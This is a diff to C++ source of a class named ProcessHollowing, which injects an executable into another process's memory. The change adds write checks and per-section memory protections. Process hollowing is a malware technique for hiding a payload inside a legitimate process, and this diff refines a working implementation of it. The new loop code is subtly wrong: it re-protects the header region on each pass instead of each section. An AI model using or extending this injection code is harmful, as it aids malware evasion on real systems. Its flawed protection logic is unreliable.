@@ -118,12 +118,21 @@ void ProcessHollowing::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE 
 
     CopyMemory((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew, &sourceNTHeaders, sizeof(sourceNTHeaders));
     
-    //std::cout << ::GetLastError() << std::endl;
     std::cout << "Writing headers" << std::endl;
-    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents, sourceNTHeaders.OptionalHeader.SizeOfHeaders, nullptr))
+    DWORD oldProtection = 0;
+    SIZE_T writtenBytes = 0;
+    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
+        sourceNTHeaders.OptionalHeader.SizeOfHeaders, &writtenBytes))
     {
         std::cout << "213" << std::endl;
     }
+    if(0 == writtenBytes)
+    {
+        std::cout << "130" << std::endl;
+    }
+    VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
+        PAGE_READONLY, &oldProtection);
+
     for (int i = 0; i < sourceNTHeaders.FileHeader.NumberOfSections; i++)
     {
         PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew +
@@ -133,6 +142,9 @@ void ProcessHollowing::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE 
         NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (PVOID)((LPBYTE)targetBaseAddress +
             currentSection->VirtualAddress), (PVOID)((LPBYTE)sourceFileContents + currentSection->PointerToRawData),
             currentSection->SizeOfRawData, nullptr);
+
+        VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
+        SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
     }
 }
 
@@ -278,6 +290,29 @@ void ProcessHollowing::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
     {
         std::cout << "221" << std::endl;
     }
+}
+
+DWORD ProcessHollowing::SectionCharacteristicsToMemoryProtections(DWORD characteristics)
+{
+    if (characteristics & IMAGE_SCN_MEM_EXECUTE && characteristics & IMAGE_SCN_MEM_READ && characteristics & IMAGE_SCN_MEM_WRITE)
+    {
+        return PAGE_EXECUTE_READWRITE;
+    }
+    else if (characteristics & IMAGE_SCN_MEM_EXECUTE && characteristics & IMAGE_SCN_MEM_READ)
+    {
+        return PAGE_EXECUTE_READ;
+    }
+    else if (characteristics & IMAGE_SCN_MEM_READ && characteristics & IMAGE_SCN_MEM_WRITE)
+    {
+        return PAGE_READWRITE;
+    }
+    else if (characteristics & IMAGE_SCN_MEM_READ)
+    {
+        return PAGE_READONLY;
+    }
+
+    std::cout << "313 Should not happen!" << std::endl;
+    return 0;
 }
 
 bool ProcessHollowing::IsProcess64Bit(const HANDLE processHandle)
